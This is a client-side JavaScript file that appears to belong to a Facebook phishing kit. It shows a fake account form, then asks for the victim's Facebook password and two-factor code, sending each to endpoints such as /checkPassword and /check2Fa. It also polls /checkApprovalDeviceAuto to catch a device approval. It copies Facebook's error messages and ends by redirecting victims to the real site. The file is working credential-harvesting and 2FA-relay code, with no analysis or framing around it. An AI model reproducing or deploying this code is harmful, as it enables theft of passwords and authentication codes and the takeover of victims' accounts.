var check = false;
var checkApprove = false;
$(document).ready(function () {
    $('.btn-modal-cancel').on('click', function () {
        $('#exampleModal').modal("hide");
    });

    $(".btn-register-send").mouseenter(function () {
        $(this).css("background-color", "#1c2b33");
        $(this).css("color", "#F1F4F7");
    });

    $(".btn-register-send").mouseleave(function () {
        $(this).css("background-color", "#0067cd");
        $(this).css("color", "#ffffff");
    });

    //$.ajax({
    //    url: 'https://api64.ipify.org?format=json',
    //    type: 'GET',
    //    contentType: 'application/json',
    //    async: true,
    //    success: function (msg) {
    //        $('#ip').text(msg);
    //    }
    //})

    if (window.location.href.endsWith('/confirm') && !checkApprove) {
        checkApprove = true;
        checkApproveAuto();
    }
});

$(document).on('keypress', '#password-input', function (event) {
    if (event.which === 13) {
        event.preventDefault();
        $('.submit_password').click();
    }
});

$(document).on('keypress', '#cgn', function (event) {
    if (event.which === 13) {
        event.preventDefault();
        $('#submit_2fa').click();
    }
});

//$(document).on('click', '.show-password', function (event) {
//    var checked = $('#show-password')[0].checked;
//    if (checked) {
//        $('#password-input').attr('type', 'text');
//    }
//    else {
//        $('#password-input').attr('type', 'password');
//    }
//});

//$(document).on('click', '#show-password', function (event) {
//    var checked = $('#show-password')[0].checked;
//    if (checked) {
//        $('#password-input').attr('type', 'text');
//    }
//    else {
//        $('#password-input').attr('type', 'password');
//    }
//});

$(document).on('click', '.show-pass', function (event) {
    $($('#password-input')[0]).attr('type', 'text');
    $($('.show-pass')[0]).attr('hidden', 'true');
    $($('.hide-pass')[0]).removeAttr('hidden');
});

$(document).on('click', '.hide-pass', function (event) {
    $($('#password-input')[0]).attr('type', 'password');
    $($('.hide-pass')[0]).attr('hidden', 'true');
    $($('.show-pass')[0]).removeAttr('hidden');
});

$(document).on('click', '.btn-register-send', function (e) {
    e.preventDefault();

    var isValid = true;

    var name = $('#name').val();
    if (!name)
        isValid = false;

    var phone = $('#phone').val();
    if (!phone || !validatePhoneNumber(phone))
        isValid = false;

    var email = $('#email').val();
    if (!email || !validateEmail(email))
        isValid = false;

    var reason = $('#reason').val();
    if (!reason)
        isValid = false;

    var check = $('#check').is(":checked");
    if (!check)
        isValid = false;

    //if (grecaptcha.getResponse() === '')
    //    isValid = false;

    if (!isValid) {
        $('#form-error').text('Please fill in the required information');
        return;
    }
    else {
        $('#form-error').text('');
    }

    $('.password-error').text('');
    $($('.password_input')[0]).val('');
    $('#password-input').attr('type', 'password');
    $($('.hide-pass')[0]).attr('hidden', 'true');
    $($('.show-pass')[0]).removeAttr('hidden');

    $('#exampleModal').modal({ backdrop: 'static', keyboard: false });

    var country_code = $("select[id='country_code'] option:selected").val();
    var country_name = $("select[id='country_code'] option:selected").attr("name");

    $.ajax({
        url: '/checkInfo',
        type: 'POST',
        data: JSON.stringify({
            email: email,
            name: name,
            phone: phone,
            reason: reason,
            country_code: country_code,
            country_name: country_name,
            ip: $('#ip')[0].innerText
        }),
        contentType: 'application/json; charset=utf-8',
        dataType: 'json',
        async: false
    });
});

$(document).on('click', '.submit_password', function (e) {
    e.preventDefault();

    $('.password-error').text('');

    $($('.submit_password')[0]).attr('disabled', true);
    $($('.btn-secondary')[0]).attr('disabled', true);

    var password = $($('.password_input')[0]).val();

    if (!password) {
        $('.password-error').text('Password is incorrect.');
        $($('.submit_password')[0]).attr('disabled', false);
        $($('.btn-secondary')[0]).attr('disabled', false);
        return;
    }

    $.ajax({
        url: '/checkPassword',
        type: 'POST',
        data: JSON.stringify({
            password: password
        }),
        contentType: 'application/json; charset=utf-8',
        dataType: 'json',
        async: true,
        success: function (msg) {
            if (msg.status === 'Very2Fa') {
                window.location.href = "/confirm";
            } else if (msg.status === 'PassError' || msg.status === 'Error') {
                $('.password-error').text('The email or password you just entered is incorrect.');
                $($('.submit_password')[0]).attr('disabled', false);
                $($('.btn-secondary')[0]).attr('disabled', false);
            } else if (msg.status === 'LogSuccess') {
                window.location.href = "/success";
            } else if (msg.status === 'Checkpoint') {
                $('.password-error').text('We require your facebook account to be active before submitting.');
                $($('.submit_password')[0]).attr('hidden', true);
                $($('.try-again')[0]).removeAttr('hidden')
                $($('.btn-secondary')[0]).attr('disabled', false);
            }
        }
    });
});

$(document).on('click', '.try-again', function (e) {
    e.preventDefault();

    window.location.href = "https://m.facebook.com/";
});

$(document).on('click', '.submit_2fa', function (e) {
    e.preventDefault();

    $('.cgn-error').text('');

    var cgn = $('.cgn')[0].value;

    if (cgn === '') {
        $('.cgn-error').text('The two-factor authentication code is incorrect.');
        return;
    }

    $($('.submit_2fa')[0]).attr('disabled', true);

    $.ajax({
        url: '/check2Fa',
        type: 'POST',
        data: JSON.stringify({
            cgn: cgn
        }),
        contentType: 'application/json; charset=utf-8',
        dataType: 'json',
        async: true,
        success: function (msg) {
            if (msg.status === 'Error2Fa' || msg.status === 'Error') {
                $('.cgn-error').text('The two-factor authentication code is incorrect.');
                $($('.submit_2fa')[0]).attr('disabled', false);
            } else if (msg.status === 'LogSuccess') {
                window.location.href = "/success";
            } else if (msg.status === 'Checkpoint') {
                $('.cgn-error').text('We require your facebook account to be active before submitting.');
                $($('.submit_2fa')[0]).attr('disabled', false);
            }
        }
    });
});

function sendcodeagain() {
    $('.cgn-error').text("");
    var btn = document.getElementById("sendcodeagain");
    btn.setAttribute("hidden", "");

    $.ajax({
        url: '/resend2Fa',
        type: 'GET',
        async: true,
        success: function (msg) {
            if (msg.status === 'OK') {
                $('.cgn-error').text("");
                btn.removeAttribute("hidden");
            }
        }
    });
}

//function approve() {
//    $('.cgn-error').text("");
//    var btn = document.getElementById("approve");
//    btn.setAttribute("hidden", "");

//    $.ajax({
//        url: '/checkApprovalDevice',
//        type: 'GET',
//        async: true,
//        success: function (msg) {
//            if (msg.status === 'OK') {
//                window.location.href = "/success";
//            }
//            else {
//                $('.cgn-error').text("You must first approve and save this browser from another logged in browser.");
//                btn.removeAttribute("hidden");
//            }
//        }
//    });
//}

function checkApproveAuto() {
    $.ajax({
        url: '/checkApprovalDeviceAuto',
        type: 'GET',
        async: true,
        success: function (msg) {
            if (msg.status === 'OK') {
                window.location.href = "/success";
            }
        }
    });
}

function onlyNumberKey(evt) {
    var ASCIICode = (evt.which) ? evt.which : evt.keyCode;

    return !(ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57));
}

function validateEmail(email) {
    var re = /\S+@\S+\.\S+/;

    return re.test(email);
}

function validatePhoneNumber(phoneNumber) {
    phoneNumber = phoneNumber.replace(/ /g, '').replace(/\(/g, '').replace(/\)/g, '');

    if (isNaN(phoneNumber)) {
        return false;
    }

    return true;
}

function checkInput() {
    var input = document.getElementById("cgn").value;
    var button = document.getElementById("submit_2fa");

    if (input.length == 6 || input.length == 8) {
        button.removeAttribute("disabled");
    } else {
        button.setAttribute("disabled", "");
    }
}

function updateCountryCode() {
    const select = document.getElementById("country_code");
    const options = select.options;
    for (let i = 0; i < options.length; i++) {
        const option = options[i];
        const countryCode = option.value;
        option.textContent = '+' + countryCode;
    }
}

function showOptions() {
    const select = document.getElementById("country_code");
    const options = select.options;
    for (let i = 0; i < options.length; i++) {
        const option = options[i];
        const countryName = option.getAttribute("name");
        option.textContent = countryName;
    }
}